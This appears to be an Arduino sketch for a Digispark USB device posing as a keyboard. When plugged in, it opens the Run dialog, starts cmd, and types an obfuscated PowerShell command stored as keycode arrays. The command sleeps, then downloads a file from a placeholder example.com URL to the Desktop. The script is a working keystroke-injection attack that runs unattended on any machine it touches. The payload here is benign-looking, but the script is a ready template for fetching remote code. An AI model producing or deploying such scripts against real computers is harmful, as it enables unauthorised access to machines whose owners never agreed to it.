#include "DigiKeyboard.h"

// cmd 
const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7, 0,44};
// "powershell Start-Sleep -Seconds 30 ; Invoke-WebRequest -Uri 'https://www.example.com/image.jpg' -OutFile $([Environment]::GetFolderPath('Desktop'))bslashimage.jpg ; cmd.exe /c"
const uint8_t key_arr_1[] PROGMEM = {2,52, 0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,23, 0,4, 0,21, 0,23, 0,45, 2,22, 0,15, 0,8, 0,8, 0,19, 0,44, 0,45, 2,22, 0,8, 0,6, 0,18, 0,17, 0,7, 0,22, 0,44, 0,32, 0,39, 0,44, 0,51, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,45, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,45, 2,24, 0,21, 0,12, 0,44, 0,52, 0,11, 0,23, 0,23, 0,19, 0,22, 2,51, 0,56, 0,56, 0,26, 0,26, 0,26, 0,55, 0,8, 0,27, 0,4, 0,16, 0,19, 0,15, 0,8, 0,55, 0,6, 0,18, 0,16, 0,56, 0,12, 0,16, 0,4, 0,10, 0,8, 0,55, 0,13, 0,19, 0,10, 0,52, 0,44, 0,45, 2,18, 0,24, 0,23, 2,9, 0,12, 0,15, 0,8, 0,44, 2,33, 2,38, 0,47, 2,8, 0,17, 0,25, 0,12, 0,21, 0,18, 0,17, 0,16, 0,8, 0,17, 0,23, 0,48, 2,51, 2,51, 2,10, 0,8, 0,23, 2,9, 0,18, 0,15, 0,7, 0,8, 0,21, 2,19, 0,4, 0,23, 0,11, 2,38, 0,52, 2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19, 0,52, 2,39, 2,39, 0,49, 0,12, 0,16, 0,4, 0,10, 0,8, 0,55, 0,13, 0,19, 0,10, 0,44, 0,51, 0,44, 0,6, 0,16, 0,7, 0,55, 0,8, 0,27, 0,8, 0,44, 0,56, 0,6, 2,52};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(5000); // DELAY 5000
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd 
    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING "powershell Start-Sleep -Seconds 30 ; I...
    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
}

void loop() {}

